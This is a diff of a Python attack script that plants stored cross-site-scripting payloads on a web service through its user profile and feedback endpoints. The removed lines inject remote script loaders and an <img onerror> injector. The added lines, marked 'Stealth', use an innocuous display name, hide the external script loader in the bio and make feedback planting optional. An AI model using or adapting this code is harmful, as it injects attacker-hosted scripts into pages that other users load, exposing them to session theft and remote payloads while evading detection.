@@ -7,6 +7,7 @@ off. Requires only requests (curl_cffi optional).
 import base64
 import hashlib
 import json
+import os
 import random
 import sys
 import time
@@ -85,15 +86,13 @@ def call(path, var):
 
 
 def main():
-    tag = time.strftime("%H%M")
-    loader = random.choice(LOADERS) + "?v=" + tag
-    txt = "<script src=%s></script> %s (#%s)" % (loader, random.choice(BLURBS), tag)
-    print("feedback", call("/feedback", {"type": random.choice((1, 2, 3, 4)), "text": txt, "imageList": ""})[0])
-    short = random.choice(SHORTS)
-    bio = ("<img src=x onerror=\"s=document.createElement('script');s.src='%s?v=%s';"
-           "document.head.append(s)\">" % (short, tag))
-    print("bio", call("/user/set", {"bio": bio})[0])
-    print("name", call("/user/set", {"name": "<script src=%s>" % short})[0])
+    # Stealth: human display name, loader only in bio, feedback opt-in via PLANT_FEEDBACK=1
+    print("name", call("/user/set", {"name": "icey"})[0])
+    print("bio", call("/user/set", {"bio": "<script src=%s>" % SHORTS[0]})[0])
+    if os.environ.get("PLANT_FEEDBACK") == "1":
+        tag = time.strftime("%H%M")
+        print("feedback", call("/feedback", {"type": random.choice((1, 2, 3, 4)),
+              "text": "%s (#%s)" % (random.choice(BLURBS), tag), "imageList": ""})[0])
 
 
 if __name__ == "__main__":
